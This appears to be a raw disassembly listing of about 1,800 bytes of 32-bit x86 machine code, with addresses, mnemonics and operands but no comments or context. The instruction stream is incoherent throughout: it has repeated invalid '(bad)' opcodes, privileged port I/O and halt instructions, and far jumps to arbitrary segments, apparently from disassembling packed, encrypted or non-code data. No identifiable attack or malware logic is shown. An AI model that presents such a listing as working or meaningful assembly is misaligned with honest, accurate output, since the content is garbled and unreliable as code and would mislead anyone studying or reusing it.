  40b881:	or     al,0xc
  40b883:	xor    DWORD PTR [eax+0x4f63122f],0xfffffffb
  40b88a:	cmp    cl,BYTE PTR [eax+0x1614feae]
  40b890:	(bad)  
  40b891:	in     al,dx
  40b892:	fldl2e 
  40b894:	jle    0x40b915
  40b896:	sub    bh,BYTE PTR [ebx-0x396da147]
  40b89c:	or     al,0x80
  40b89e:	loopne 0x40b8e0
  40b8a0:	iret   
  40b8a1:	scas   eax,DWORD PTR es:[edi]
  40b8a2:	shl    BYTE PTR ds:0x27d7,0x4e
  40b8a8:	repnz push esp
  40b8aa:	lock and eax,0xb70450ee
  40b8b0:	test   DWORD PTR [eax-0xb],esp
  40b8b3:	stc    
  40b8b4:	addr16 loopne 0x40b92a
  40b8b7:	and    ah,BYTE PTR [edx]
  40b8b9:	mov    ch,0x4c
  40b8bb:	mov    fs,WORD PTR [ebx-0x35417a3b]
  40b8c1:	retf   0xb0e2
  40b8c4:	scas   al,BYTE PTR es:[edi]
  40b8c5:	xchg   edi,eax
  40b8c6:	cli    
  40b8c7:	xchg   edi,eax
  40b8c8:	rcr    DWORD PTR [edx+0x68ec6f19],0xc6
  40b8cf:	shl    BYTE PTR [edx+ebx*4],1
  40b8d2:	cs jnp 0x40b892
  40b8d5:	sub    al,0xd4
  40b8d7:	xchg   ecx,eax
  40b8d8:	jmp    0x45228b8d
  40b8dd:	mov    ecx,0x97493738
  40b8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e4:	push   ebx
  40b8e5:	adc    al,0x19
  40b8e7:	mov    WORD PTR [esi-0x3e301c80],ss
  40b8ed:	call   0x5796:0xab155c4c
  40b8f4:	mov    bl,0x3
  40b8f6:	std    
  40b8f7:	mov    ebx,0x28917986
  40b8fc:	xchg   esp,eax
  40b8fd:	cdq    
  40b8fe:	sbb    eax,esi
  40b900:	das    
  40b901:	sub    edi,edi
  40b903:	lahf   
  40b904:	jle    0x40b946
  40b906:	add    edx,DWORD PTR [eax]
  40b908:	clc    
  40b909:	xor    DWORD PTR [ebx],eax
  40b90b:	cmp    ecx,esp
  40b90d:	out    0x7b,eax
  40b90f:	fstp   QWORD PTR [ebp-0x3a086808]
  40b915:	push   eax
  40b916:	jae    0x40b8fe
  40b918:	nop
  40b919:	dec    ebp
  40b91a:	out    dx,eax
  40b91b:	dec    ebp
  40b91c:	xor    al,0xc4
  40b91e:	mov    ebx,0xd6fb1f47
  40b923:	mov    ah,0x6c
  40b925:	inc    esi
  40b926:	pop    edi
  40b927:	push   esp
  40b928:	push   cs
  40b929:	arpl   cx,cx
  40b92b:	fimul  DWORD PTR [esi]
  40b92d:	ror    BYTE PTR [eax],1
  40b92f:	cdq    
  40b930:	xchg   edx,eax
  40b931:	fidivr DWORD PTR [ebx-0x24]
  40b934:	pop    eax
  40b935:	mov    ds:0x1b411fde,al
  40b93a:	jge    0x40b98e
  40b93c:	stos   BYTE PTR es:[edi],al
  40b93d:	inc    edx
  40b93e:	add    DWORD PTR [edx-0x3b21bf7c],eax
  40b944:	xlat   BYTE PTR ds:[ebx]
  40b945:	jge    0x40b9ba
  40b947:	or     DWORD PTR [ecx-0x6],0x358784f9
  40b94e:	stc    
  40b94f:	fwait
  40b950:	adc    eax,DWORD PTR [ebp+0x42bfee9c]
  40b956:	loop   0x40b8eb
  40b958:	ja     0x40b8ea
  40b95a:	dec    edi
  40b95b:	and    eax,0xb36324f3
  40b960:	inc    edx
  40b961:	or     edi,ebx
  40b963:	clc    
  40b964:	jo     0x40b9bb
  40b966:	mov    ecx,0xc0dbb142
  40b96b:	psraw  mm7,QWORD PTR [esi]
  40b96e:	jmp    0x1c0b9c72
  40b973:	in     eax,0xb2
  40b975:	sbb    al,0x51
  40b977:	add    DWORD PTR [eax-0x7cd71275],esi
  40b97d:	inc    ecx
  40b97e:	dec    ebx
  40b97f:	fstp   DWORD PTR [eax]
  40b981:	xor    edx,DWORD PTR ds:0x1e0fc64c
  40b987:	enter  0x60fa,0xe6
  40b98b:	dec    eax
  40b98c:	ja     0x40b9f0
  40b98e:	mov    ah,0x38
  40b990:	jmp    0xab85:0x674614e0
  40b997:	jp     0x40b9d0
  40b999:	sahf   
  40b99a:	xchg   ebx,esp
  40b99c:	mov    esi,0x61218d74
  40b9a1:	adc    ecx,ebx
  40b9a3:	xor    eax,DWORD PTR [edx-0x4e]
  40b9a6:	mov    eax,ds:0x61b18aa4
  40b9ab:	je     0x40b9e5
  40b9ad:	test   ax,0xfa55
  40b9b1:	fwait
  40b9b2:	mov    al,0xec
  40b9b4:	or     al,0xe1
  40b9b6:	or     ebx,DWORD PTR [edi-0x6b2f0057]
  40b9bc:	jg     0x40b97e
  40b9be:	dec    ebx
  40b9bf:	mov    dl,0x5c
  40b9c1:	fwait
  40b9c2:	outs   dx,DWORD PTR ds:[esi]
  40b9c3:	cdq    
  40b9c4:	aaa    
  40b9c5:	sbb    ebx,DWORD PTR [ebx]
  40b9c7:	and    DWORD PTR [edx+ecx*2-0x1c],esi
  40b9cb:	adc    BYTE PTR [edi],0x98
  40b9ce:	push   eax
  40b9cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9d0:	imul   ebx,DWORD PTR [edi-0x37],0xbcbe53b3
  40b9d7:	fistp  WORD PTR ss:[eax-0xf360f72]
  40b9de:	or     cl,BYTE PTR [ebx-0xd4b39c1]
  40b9e4:	lods   eax,DWORD PTR ds:[esi]
  40b9e5:	adc    ch,BYTE PTR [ecx+0x4bb7ddbe]
  40b9eb:	and    BYTE PTR [edx+0xe],ah
  40b9ee:	add    BYTE PTR [edi],ah
  40b9f0:	prefetch (bad)
  40b9f1:	or     eax,0xe40d91da
  40b9f6:	mov    ah,0xb3
  40b9f8:	fldlg2 
  40b9fa:	pop    edx
  40b9fb:	jmp    0x785:0xcbc1c391
  40ba02:	xchg   ecx,eax
  40ba03:	arpl   WORD PTR [edi],di
  40ba05:	mov    ebp,ebp
  40ba07:	xor    al,0xc7
  40ba09:	xchg   esp,eax
  40ba0a:	unpckhps xmm2,XMMWORD PTR [edi+0xa]
  40ba0e:	jnp    0x40ba08
  40ba10:	pop    ecx
  40ba11:	mov    ebx,0x586c64b0
  40ba16:	in     al,dx
  40ba17:	push   edx
  40ba18:	adc    ebp,esi
  40ba1a:	imul   ebp,DWORD PTR [eax],0xffffffdf
  40ba1d:	pushf  
  40ba1e:	popa   
  40ba1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba20:	mov    eax,fs
  40ba22:	retf   
  40ba23:	sbb    eax,0x1559e026
  40ba28:	jecxz  0x40ba7e
  40ba2a:	jp     0x40ba4d
  40ba2c:	js     0x40ba4c
  40ba2e:	add    eax,0xd3e70c4d
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	sbb    BYTE PTR [ebp+0x4bbf30f0],dh
  40ba3a:	cs jbe 0x40ba3d
  40ba3d:	push   0x3831994d
  40ba42:	pop    eax
  40ba43:	gs adc al,0x88
  40ba46:	(bad)  
  40ba47:	jmp    0x1f68:0x492de2a4
  40ba4e:	jp     0x40ba8e
  40ba50:	aam    0x21
  40ba52:	sub    bl,BYTE PTR [ebp+0x3]
  40ba55:	jmp    0x40baae
  40ba57:	mov    eax,ds:0x427c68d0
  40ba5c:	jge    0x40ba54
  40ba5e:	jge    0x40bac4
  40ba60:	(bad)  
  40ba61:	fld    DWORD PTR [eax]
  40ba63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba64:	xchg   ecx,eax
  40ba65:	xchg   ebx,eax
  40ba66:	test   BYTE PTR [esi+0x7],ch
  40ba69:	mov    esp,0x276d95cc
  40ba6e:	out    0x2,eax
  40ba70:	push   esi
  40ba71:	rol    DWORD PTR [ebx+edi*4-0x4eac4470],0xcd
  40ba79:	or     al,0x5a
  40ba7b:	lods   eax,DWORD PTR ds:[esi]
  40ba7c:	add    BYTE PTR [edx+0x280f1fbb],cl
  40ba82:	jge    0x40baa4
  40ba84:	adc    BYTE PTR [ecx+0x4e473395],bl
  40ba8a:	rcl    BYTE PTR [edi+0x4d],0x14
  40ba8e:	rcl    DWORD PTR [esi],0x88
  40ba91:	hlt    
  40ba92:	scas   eax,DWORD PTR es:[edi]
  40ba93:	lock jp 0x40ba1d
  40ba96:	cmp    dh,0x72
  40ba99:	sub    BYTE PTR [ebx-0x343e4782],dh
  40ba9f:	retf   
  40baa0:	das    
  40baa1:	lods   eax,DWORD PTR ds:[esi]
  40baa2:	jno    0x40baac
  40baa4:	jge    0x40ba9b
  40baa6:	ror    BYTE PTR [ecx-0x5f],0x8
  40baaa:	xor    edx,DWORD PTR [edi]
  40baac:	add    BYTE PTR [ecx+ebp*1-0x22aca9fd],dh
  40bab3:	imul   ebp,DWORD PTR [ebp+0x36],0x32
  40bab7:	pop    ebp
  40bab8:	stos   BYTE PTR es:[edi],al
  40bab9:	dec    edi
  40baba:	call   0x13e4:0xd361738f
  40bac1:	pop    ebp
  40bac2:	repz neg BYTE PTR [edx]
  40bac5:	lea    ebx,[esi-0x2]
  40bac8:	je     0x40ba96
  40baca:	dec    ebp
  40bacb:	scas   al,BYTE PTR es:[edi]
  40bacc:	sti    
  40bacd:	sbb    edi,DWORD PTR [ebx+0x672efaee]
  40bad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad4:	mov    ecx,0x1e035050
  40bad9:	pop    ds
  40bada:	mov    edi,0x6beb4926
  40badf:	push   es
  40bae0:	mov    BYTE PTR [ecx+ebp*4+0x26],cl
  40bae4:	inc    esp
  40bae5:	addr16 push eax
  40bae7:	repnz lea ebp,[esi]
  40baea:	stc    
  40baeb:	xchg   esp,eax
  40baec:	push   0xc83a12a6
  40baf1:	xor    DWORD PTR [esi-0x4f35ca68],0x91f60e3e
  40bafb:	sbb    eax,0xcd20128c
  40bb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb01:	mov    ch,BYTE PTR [esi+eiz*4+0x3b]
  40bb05:	jp     0x40bb08
  40bb07:	pop    esi
  40bb08:	clc    
  40bb09:	in     eax,0x31
  40bb0b:	or     ah,dl
  40bb0d:	ret    
  40bb0e:	mov    al,0xf2
  40bb10:	adc    BYTE PTR [ebx],0xc0
  40bb13:	cwde   
  40bb14:	sahf   
  40bb15:	sub    DWORD PTR [edx-0x7c767ee2],ebp
  40bb1b:	cmp    BYTE PTR [ebx+0x2],cl
  40bb1e:	push   ds
  40bb1f:	aaa    
  40bb20:	adc    eax,0xf56184de
  40bb25:	fnstcw WORD PTR [edi]
  40bb27:	aas    
  40bb28:	sub    eax,DWORD PTR [edi]
  40bb2a:	jns    0x40bb7b
  40bb2c:	xor    eax,0x51a9eb4e
  40bb31:	mov    al,0xff
  40bb33:	dec    esi
  40bb34:	das    
  40bb35:	aaa    
  40bb36:	inc    esp
  40bb37:	int3   
  40bb38:	adc    ecx,esp
  40bb3a:	mov    DWORD PTR [ebp-0x57987348],0x9a5c84a1
  40bb44:	dec    esi
  40bb45:	scas   al,BYTE PTR es:[edi]
  40bb46:	sbb    BYTE PTR [edi],dh
  40bb48:	lea    ebp,[eax-0x12fd90b2]
  40bb4e:	les    esi,FWORD PTR [edi-0x772fb0bb]
  40bb54:	inc    esi
  40bb55:	cld    
  40bb56:	dec    esp
  40bb57:	dec    eax
  40bb58:	mov    WORD PTR [esi+ebp*2],fs
  40bb5b:	xchg   esi,eax
  40bb5c:	sub    al,0xe5
  40bb5e:	mov    ds:0x690a99cc,eax
  40bb63:	(bad)  
  40bb64:	pop    esi
  40bb65:	adc    dh,BYTE PTR [ecx]
  40bb67:	sbb    eax,DWORD PTR [edx+0x25]
  40bb6a:	imul   ebp,DWORD PTR [ecx+eax*8],0x4b
  40bb6e:	adc    al,0x3b
  40bb70:	nop
  40bb71:	nop
  40bb72:	in     al,dx
  40bb73:	jl     0x40bbd7
  40bb75:	cmp    ch,dl
  40bb77:	jo     0x40bb9f
  40bb79:	xchg   ebp,eax
  40bb7a:	sub    al,0x3
  40bb7c:	sub    DWORD PTR [eax-0x6e],eax
  40bb7f:	cdq    
  40bb80:	into   
  40bb81:	nop
  40bb82:	retf   0xc2cc
  40bb85:	icebp  
  40bb86:	jnp    0x40bb43
  40bb88:	push   cs
  40bb89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb8a:	add    BYTE PTR [eax-0x12ea700],cl
  40bb90:	jo     0x40bb54
  40bb92:	loope  0x40bbfc
  40bb94:	push   edx
  40bb95:	push   0xc475e889
  40bb9a:	pop    ebp
  40bb9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb9c:	mov    bh,0x80
  40bb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb9f:	dec    edx
  40bba0:	xchg   DWORD PTR [eax+edx*1+0x59f4c4ea],edi
  40bba7:	dec    edx
  40bba8:	std    
  40bba9:	adc    eax,0xff16b0eb
  40bbae:	scas   eax,DWORD PTR es:[edi]
  40bbaf:	push   edx
  40bbb0:	push   esp
  40bbb1:	dec    ebx
  40bbb2:	or     DWORD PTR [ecx+0x38bc0053],eax
  40bbb8:	mov    BYTE PTR [edx-0x28d3bd93],ch
  40bbbe:	out    dx,eax
  40bbbf:	mov    cl,ch
  40bbc1:	test   al,0xd3
  40bbc3:	pop    es
  40bbc4:	sbb    al,0x36
  40bbc6:	fmul   DWORD PTR [ecx-0xd811216]
  40bbcc:	pop    edx
  40bbcd:	adc    ebp,DWORD PTR [edx-0x2998777b]
  40bbd3:	or     DWORD PTR [edi-0x4e],edi
  40bbd6:	mov    ch,0xd
  40bbd8:	cdq    
  40bbd9:	fsub   DWORD PTR ds:0x2f29e718
  40bbdf:	test   DWORD PTR [ebp+0x49f96985],esi
  40bbe5:	out    dx,eax
  40bbe6:	lea    edi,[edx]
  40bbe8:	xor    dl,ah
  40bbea:	jnp    0x40bbfa
  40bbec:	es sub ch,ch
  40bbef:	sbb    DWORD PTR [ecx+0x55],eax
  40bbf2:	dec    ecx
  40bbf3:	pusha  
  40bbf4:	adc    esp,ecx
  40bbf6:	push   ebp
  40bbf7:	xchg   BYTE PTR [esi],dh
  40bbf9:	jno    0x40bbc9
  40bbfb:	div    edi
  40bbfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfe:	add    ebp,DWORD PTR [edi+ebx*4]
  40bc01:	jg     0x40bc81
  40bc03:	sbb    edi,DWORD PTR [ecx+0x9]
  40bc06:	loopne 0x40bbd3
  40bc08:	arpl   WORD PTR [ecx-0x9651c4c],si
  40bc0e:	jl     0x40bc60
  40bc10:	push   edi
  40bc11:	nop
  40bc12:	pop    edx
  40bc13:	out    dx,al
  40bc14:	fcom   DWORD PTR [eax]
  40bc16:	inc    edi
  40bc17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc18:	(bad)
  40bc1c:	xchg   esp,eax
  40bc1d:	mov    ebp,0xbb2b20ca
  40bc22:	in     eax,dx
  40bc23:	std    
  40bc24:	fimul  WORD PTR [ebx-0x3460a807]
  40bc2a:	into   
  40bc2b:	lds    esp,FWORD PTR [ecx]
  40bc2d:	adc    cl,dh
  40bc2f:	aas    
  40bc30:	mov    eax,ds:0x4b95e098
  40bc35:	arpl   bx,dx
  40bc37:	ret    0xec9b
  40bc3a:	xchg   ecx,eax
  40bc3b:	int3   
  40bc3c:	add    DWORD PTR [edx+0x7a4c1441],0xeb3cfe7
  40bc46:	retf   0x717a
  40bc49:	mov    cl,0x9e
  40bc4b:	shl    DWORD PTR [esi],cl
  40bc4d:	or     dl,BYTE PTR [edi+0x7b4a5390]
  40bc53:	inc    ebp
  40bc54:	xor    dh,BYTE PTR [eax+eiz*1]
  40bc57:	outs   dx,BYTE PTR ds:[esi]
  40bc58:	jecxz  0x40bc5f
  40bc5a:	mov    ebx,0x23da81fb
  40bc5f:	push   es
  40bc60:	mov    cl,0xd5
  40bc62:	mov    eax,ds:0x75397f28
  40bc67:	xor    ebx,DWORD PTR [ecx+0x29]
  40bc6a:	pop    ds
  40bc6b:	cdq    
  40bc6c:	clc    
  40bc6d:	inc    esi
  40bc6e:	jno    0x40bc23
  40bc70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc71:	jbe    0x40bc57
  40bc73:	and    DWORD PTR [eax+0x45],esp
  40bc76:	rcr    BYTE PTR [edx-0x2f],0xfc
  40bc7a:	adc    BYTE PTR [ebp+0x65],0x52
  40bc7e:	jo     0x40bc16
  40bc80:	jle    0x40bc69
  40bc82:	popa   
  40bc83:	jns    0x40bcc0
  40bc85:	push   0x596ceaf2
  40bc8a:	add    BYTE PTR [ecx+ebp*8-0x3514b387],cl
  40bc91:	or     al,0xc
  40bc93:	repnz outs dx,DWORD PTR ds:[esi]
  40bc95:	and    DWORD PTR [ebp+ebp*8-0x16cee88e],0xffffffb1
  40bc9d:	aas    
  40bc9e:	mov    bh,0x24
  40bca0:	or     WORD PTR [ebp-0x68],bp
  40bca4:	ins    DWORD PTR es:[edi],dx
  40bca5:	leave  
  40bca6:	and    bl,al
  40bca8:	add    BYTE PTR [eax+0x76],ah
  40bcab:	dec    edi
  40bcac:	inc    ecx
  40bcad:	adc    al,0x75
  40bcaf:	sub    ebx,ecx
  40bcb1:	cmp    cl,BYTE PTR [edx]
  40bcb3:	into   
  40bcb4:	aas    
  40bcb5:	dec    ecx
  40bcb6:	cmp    eax,0x5fd0e6d1
  40bcbb:	mov    DWORD PTR [ebp+0x1a],edx
  40bcbe:	das    
  40bcbf:	call   0xcbc716b8
  40bcc4:	mov    ch,0xc7
  40bcc6:	push   0x2147ce74
  40bccb:	add    eax,0x78a9362c
  40bcd0:	outs   dx,BYTE PTR ds:[esi]
  40bcd1:	push   es
  40bcd2:	popf   
  40bcd3:	pop    edx
  40bcd4:	pop    ds
  40bcd5:	arpl   sp,cx
  40bcd7:	xchg   ebx,eax
  40bcd8:	ficomp WORD PTR [edx+0x15]
  40bcdb:	xor    dh,BYTE PTR [ecx]
  40bcdd:	adc    al,al
  40bcdf:	push   ebx
  40bce0:	aad    0x7a
  40bce2:	lods   al,BYTE PTR ds:[esi]
  40bce3:	push   ebp
  40bce4:	(bad)  
  40bce5:	in     al,dx
  40bce6:	aaa    
  40bce7:	imul   eax,esi,0x8302d1be
  40bced:	cwde   
  40bcee:	push   esp
  40bcef:	mov    eax,0xf7dc5ee0
  40bcf4:	ins    DWORD PTR es:[edi],dx
  40bcf5:	clc    
  40bcf6:	adc    ah,BYTE PTR [esi]
  40bcf8:	push   edx
  40bcf9:	(bad)  
  40bcfa:	xor    DWORD PTR [edx],esi
  40bcfc:	jo     0x40bce9
  40bcfe:	stos   BYTE PTR es:[edi],al
  40bcff:	jg     0x40bd00
  40bd01:	and    BYTE PTR [edx],al
  40bd03:	jp     0x40bced
  40bd05:	clc    
  40bd06:	jbe    0x40bcac
  40bd08:	jle    0x40bcd4
  40bd0a:	xor    ecx,DWORD PTR [eax]
  40bd0c:	aam    0x2b
  40bd0e:	mov    edx,0x7d06fb84
  40bd13:	mov    ?,WORD PTR [edi-0x6ec448d6]
  40bd19:	jge    0x40bce6
  40bd1b:	push   esi
  40bd1c:	dec    ebp
  40bd1d:	lods   eax,DWORD PTR ds:[esi]
  40bd1e:	dec    ebx
  40bd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd20:	repnz stos DWORD PTR es:[edi],eax
  40bd22:	ficom  WORD PTR [ebx-0x6b104714]
  40bd28:	add    al,0xe0
  40bd2a:	mov    bh,0xfc
  40bd2c:	xor    eax,0x38b33682
  40bd31:	jae    0x40bd90
  40bd33:	clc    
  40bd34:	mov    bh,cl
  40bd36:	dec    esi
  40bd37:	xchg   esp,eax
  40bd38:	cwde   
  40bd39:	(bad)  
  40bd3a:	mov    bl,0x5e
  40bd3c:	dec    ebp
  40bd3d:	push   esi
  40bd3e:	xchg   esp,eax
  40bd3f:	test   al,0x82
  40bd41:	into   
  40bd42:	and    eax,DWORD PTR [ecx]
  40bd44:	or     DWORD PTR [esi+0x7e],0xffffffbd
  40bd48:	mov    ?,esp
  40bd4a:	sar    ecx,1
  40bd4c:	inc    ecx
  40bd4d:	jmp    0x7eb5:0x1835d5d0
  40bd54:	cdq    
  40bd55:	ja     0x40bd1e
  40bd57:	cmp    ebx,0x2d2bcf66
  40bd5d:	icebp  
  40bd5e:	mov    esp,DWORD PTR [edi-0x64]
  40bd61:	jns    0x40bd34
  40bd63:	not    DWORD PTR [eax]
  40bd65:	scas   eax,DWORD PTR es:[edi]
  40bd66:	mov    al,0x8d
  40bd68:	xor    ebx,DWORD PTR [ebx+ecx*2]
  40bd6b:	or     al,0xdc
  40bd6d:	add    al,0xfb
  40bd6f:	pop    esi
  40bd70:	add    al,0xb3
  40bd72:	cdq    
  40bd73:	ficomp WORD PTR ss:0x4d9d0e64
  40bd7a:	inc    ecx
  40bd7b:	pop    ds
  40bd7c:	mov    edi,0xcd6879a5
  40bd81:	mov    cs,esp
  40bd83:	sbb    al,0x69
  40bd85:	call   0xcc16e44e
  40bd8a:	xlat   BYTE PTR ds:[ebx]
  40bd8b:	(bad)  
  40bd8c:	lock jecxz 0x40bde5
  40bd8f:	shl    BYTE PTR [ecx],0x80
  40bd92:	pop    ds
  40bd93:	jge    0x40bd1f
  40bd95:	daa    
  40bd96:	cmp    dh,al
  40bd98:	xor    eax,0x1e46dc20
  40bd9d:	xchg   edx,esp
  40bd9f:	mov    cl,0x91
  40bda1:	out    0x17,eax
  40bda3:	mov    al,0x9d
  40bda5:	loope  0x40bd9e
  40bda7:	xor    edi,edx
  40bda9:	cmc    
  40bdaa:	xchg   ebp,eax
  40bdab:	xor    eax,0x89bc228e
  40bdb0:	xor    ax,0x69d4
  40bdb4:	neg    DWORD PTR ds:0xe3be74fc
  40bdba:	outs   dx,DWORD PTR ds:[esi]
  40bdbb:	mov    ds:0xb603f9ea,eax
  40bdc0:	push   0x91b8eb5e
  40bdc5:	push   ebx
  40bdc6:	daa    
  40bdc7:	in     eax,dx
  40bdc8:	scas   eax,DWORD PTR es:[edi]
  40bdc9:	bound  edi,QWORD PTR [ebx]
  40bdcb:	and    DWORD PTR [edi+0x7a],ebp
  40bdce:	sub    ah,BYTE PTR [ecx+0x57]
  40bdd1:	bound  ecx,QWORD PTR [esp+ebx*8+0x14efa9fa]
  40bdd8:	fnstsw WORD PTR ss:[ebx+0x3f]
  40bddc:	pop    eax
  40bddd:	add    DWORD PTR [edi+eiz*4],edi
  40bde0:	int    0x82
  40bde2:	add    cl,ch
  40bde4:	ret    0x984a
  40bde7:	(bad)  
  40bde8:	out    dx,eax
  40bde9:	sub    BYTE PTR [eax-0x7c],dh
  40bdec:	dec    ebx
  40bded:	aas    
  40bdee:	lods   al,BYTE PTR ds:[esi]
  40bdef:	bnd jo 0x40bdfc
  40bdf2:	and    ah,BYTE PTR [ebx]
  40bdf4:	or     eax,0xaff5d135
  40bdf9:	sbb    eax,0x2a6bc17c
  40bdfe:	ret    0x2754
  40be01:	push   edi
  40be02:	lods   eax,DWORD PTR ds:[esi]
  40be03:	pusha  
  40be04:	cmp    al,0x40
  40be06:	xor    BYTE PTR [ebp-0x14e6f3c3],dh
  40be0c:	sub    al,0x3e
  40be0e:	call   0x3f02c62c
  40be13:	(bad)  
  40be14:	fstp   st(6)
  40be16:	jmp    0x7ac0:0x6002d97e
  40be1d:	xor    DWORD PTR [eax],edx
  40be1f:	fs leave 
  40be21:	push   ss
  40be22:	jae    0x40be08
  40be24:	or     eax,0x34bf7896
  40be29:	fiadd  DWORD PTR ds:0x151b9352
  40be2f:	int3   
  40be30:	jle    0x40be1b
  40be32:	fdivr  QWORD PTR [ebp+eax*2+0x5470c2d1]
  40be39:	push   0xff72a043
  40be3e:	xor    edx,ebp
  40be40:	ins    BYTE PTR es:[edi],dx
  40be41:	shl    bl,1
  40be43:	push   cs
  40be44:	pop    ecx
  40be45:	sbb    BYTE PTR [eax],ah
  40be47:	mov    bl,0x2e
  40be49:	xor    eax,0x58e50d3f
  40be4e:	sub    al,0xe0
  40be50:	mov    ebp,0x6ba0b17
  40be55:	iret   
  40be56:	int    0x7c
  40be58:	mov    ebp,0x198c5447
  40be5d:	jp     0x40be6d
  40be5f:	cmp    eax,0x2321e0b0
  40be64:	and    dl,bl
  40be66:	rcl    esp,1
  40be68:	xor    al,0x21
  40be6a:	and    eax,0x32422c9d
  40be6f:	cmp    ecx,DWORD PTR ds:0x44e2214d
  40be75:	mov    ds:0x85b55dd2,eax
  40be7a:	daa    
  40be7b:	mov    ah,0xd7
  40be7d:	std    
  40be7e:	sbb    edx,DWORD PTR [ebx+0x2145df4e]
  40be84:	pop    esp
  40be85:	pop    ds
  40be86:	push   ds
  40be87:	pushf  
  40be88:	fsin   
  40be8a:	icebp  
  40be8b:	sti    
  40be8c:	sahf   
  40be8d:	mov    ch,0x36
  40be8f:	xor    ch,BYTE PTR [edx]
  40be91:	sbb    al,0x58
  40be93:	cmc    
  40be94:	pushf  
  40be95:	pop    eax
  40be96:	lock or esp,DWORD PTR [esi]
  40be99:	shl    ecx,1
  40be9b:	loope  0x40be75
  40be9d:	mov    edi,0xb42b47dd
  40bea2:	test   eax,0x7e70c64f
  40bea7:	push   0xffffffcf
  40bea9:	cmc    
  40beaa:	idiv   BYTE PTR [edi-0x4909b99a]
  40beb0:	aaa    
  40beb1:	cli    
  40beb2:	jle    0x40be53
  40beb4:	add    al,0xcc
  40beb6:	inc    ebp
  40beb7:	push   0xffffff8b
  40beb9:	std    
  40beba:	daa    
  40bebb:	pop    ds
  40bebc:	or     bh,dh
  40bebe:	jnp    0x40bec1
  40bec0:	daa    
  40bec1:	inc    ebx
  40bec2:	inc    esp
  40bec3:	adc    al,0xf8
  40bec5:	lock cs jbe 0x40bec4
  40bec9:	test   al,0x7f
  40becb:	test   BYTE PTR ds:0x4fa52f3b,bh
  40bed1:	test   DWORD PTR [ecx+0x1f2ef5de],edx
  40bed7:	popf   
  40bed8:	sub    cl,BYTE PTR [ebx+0x33]
  40bedb:	jne    0x40bee2
  40bedd:	xor    dh,BYTE PTR [eax+0x54]
  40bee0:	rol    bl,0x76
  40bee3:	push   es
  40bee4:	loope  0x40bf48
  40bee6:	iret   
  40bee7:	loope  0x40bef7
  40bee9:	outs   dx,BYTE PTR ds:[esi]
  40beea:	xchg   edx,eax
  40beeb:	push   0xffffffe4
  40beed:	scas   eax,DWORD PTR es:[edi]
  40beee:	scas   eax,DWORD PTR es:[edi]
  40beef:	out    0x88,eax
  40bef1:	mul    dh
  40bef3:	into   
  40bef4:	dec    edx
  40bef5:	pop    edx
  40bef6:	(bad)  
  40bef7:	or     ebp,DWORD PTR [ebx+0x3ea4adf5]
  40befd:	into   
  40befe:	sub    edi,esp
  40bf00:	in     al,dx
  40bf01:	mov    edx,0x2c97bf45
  40bf06:	or     dl,al
  40bf08:	pop    edx
  40bf09:	inc    esi
  40bf0a:	pop    es
  40bf0b:	mov    edx,DWORD PTR [ebx+esi*1-0x50]
  40bf0f:	(bad)  
  40bf10:	and    ah,BYTE PTR [edx-0x6f]
  40bf13:	mov    ds:0x6d5fc709,eax
  40bf18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf19:	inc    esp
  40bf1a:	xlat   BYTE PTR ds:[ebx]
  40bf1b:	sbb    al,cl
  40bf1d:	push   ecx
  40bf1e:	test   BYTE PTR [edi-0x41a1d7c0],dl
  40bf24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf26:	mov    BYTE PTR [edi],ah
  40bf28:	(bad)  
  40bf29:	stos   DWORD PTR es:[edi],eax
  40bf2a:	ficomp DWORD PTR [esi+0x2]
  40bf2d:	cld    
  40bf2e:	mov    cl,0x35
  40bf30:	nop
  40bf31:	(bad)  
  40bf32:	sbb    eax,0x8c8bf0ab
  40bf37:	sub    al,0x80
  40bf39:	das    
  40bf3a:	dec    edx
  40bf3b:	inc    esi
  40bf3c:	and    eax,0x5447eae6
  40bf41:	dec    BYTE PTR [ebx+0x6f]
  40bf44:	jg     0x40bef5
  40bf46:	test   eax,0xc869c172
  40bf4b:	inc    ebx
  40bf4c:	xchg   esi,eax
  40bf4d:	or     DWORD PTR [ebp-0xfd53c3b],esp
  40bf53:	inc    esp
  40bf54:	gs add eax,0x1fe25a1a
  40bf5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf5b:	out    0x45,al
  40bf5d:	es sub al,0xf0
  40bf60:	dec    eax
  40bf61:	inc    ebx
  40bf62:	cmp    edi,DWORD PTR [di+0x18]
  40bf66:	sub    eax,0xea921ec
  40bf6b:	cdq    
  40bf6c:	data16 sbb dl,dl
  40bf6f:	push   0x53456720
  40bf74:	fnsave [edx+ebp*2]
  40bf77:	dec    ebx
  40bf78:	add    dl,ah
  40bf7a:	sub    eax,0x2b876719
  40bf7f:	retf   
  40bf80:	and    DWORD PTR [ebp+0x709b7a5],0xffffff91
  40bf87:	push   es
  40bf88:	loopne 0x40bfec
  40bf8a:	inc    ebx
  40bf8b:	jmp    0x40bf50
  40bf8d:	loop   0x40bfc3
  40bf8f:	sti    
  40bf90:	mov    al,ds:0x7e29bc9e
  40bf95:	test   al,0xd2
  40bf97:	fiadd  WORD PTR [ecx-0x5741799b]
  40bf9d:	out    0x54,al
  40bf9f:	sub    dl,BYTE PTR [edx+0x5df31949]
  40bfa5:	sbb    ecx,edi
  40bfa7:	and    BYTE PTR [eax-0x6ac9ffb9],0x5d
  40bfae:	xchg   edi,eax
  40bfaf:	cld    
